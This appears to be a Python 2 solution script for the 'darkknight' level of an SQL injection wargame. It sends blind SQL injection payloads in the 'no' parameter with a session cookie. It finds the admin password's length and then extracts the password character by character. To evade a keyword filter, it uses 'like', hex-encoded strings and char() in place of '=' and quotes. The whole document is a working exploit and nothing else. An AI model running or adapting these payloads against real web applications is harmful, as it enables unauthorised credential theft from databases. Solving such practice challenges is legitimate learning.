import requests
cooki = {'PHPSESSID': "otscuf8q15lrb320f1jnkt8c9j"}
url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?"
i = 1
key = "Hello admin"
pw_len = 0
while True:
    params = {'no': "1||length(pw) like "+str(i)+"#"}
    res = requests.get(url, params, cookies=cooki)
    #print res.text
    if key in res.text:
        pw_len = i
        break
    i = i + 1
    print i
print pw_len
for j in range(1,pw_len+1):
    for k in range(48, 123):
        if 58 <= k < 65:
            continue
        if 91 <= k < 97:
            continue
        params = {'no': "1 || id like 0x61646d696e && (left(right(pw,"+str(j)+"),1)) like char("+str(k)+")#"}
        res2 = requests.get(url, params, cookies=cooki)
        #
        if key in res2.text:
            print str(j) + " : " + chr(k)
